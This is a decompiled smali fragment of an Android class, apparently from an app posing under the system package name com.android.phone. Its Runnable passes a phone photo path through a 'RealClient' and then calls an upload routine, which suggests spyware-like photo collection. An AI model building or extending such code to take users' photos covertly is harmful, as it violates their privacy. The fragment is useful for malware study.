.class Lcom/android/phone/event/MmsEvent$3;
.super Ljava/lang/Object;
.source "MmsEvent.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/phone/event/MmsEvent;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/phone/event/MmsEvent;

.field private final synthetic val$photoInPhone:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/android/phone/event/MmsEvent;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/phone/event/MmsEvent$3;->this$0:Lcom/android/phone/event/MmsEvent;

    iput-object p2, p0, Lcom/android/phone/event/MmsEvent$3;->val$photoInPhone:Ljava/lang/String;

    .line 103
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .prologue
    .line 107
    iget-object v1, p0, Lcom/android/phone/event/MmsEvent$3;->this$0:Lcom/android/phone/event/MmsEvent;

    invoke-static {v1}, Lcom/android/phone/event/MmsEvent;->access$0(Lcom/android/phone/event/MmsEvent;)Lcom/android/phone/client/RealClient;

    move-result-object v1

    iget-object v2, p0, Lcom/android/phone/event/MmsEvent$3;->val$photoInPhone:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/android/phone/client/RealClient;->updateText(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 108
    .local v0, "ret":Ljava/lang/String;
    sget-object v1, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    invoke-static {v1, v0}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 109
    iget-object v1, p0, Lcom/android/phone/event/MmsEvent$3;->this$0:Lcom/android/phone/event/MmsEvent;

    invoke-virtual {v1, v0}, Lcom/android/phone/event/MmsEvent;->eventUploadPicture(Ljava/lang/String;)V

    .line 110
    return-void
.end method
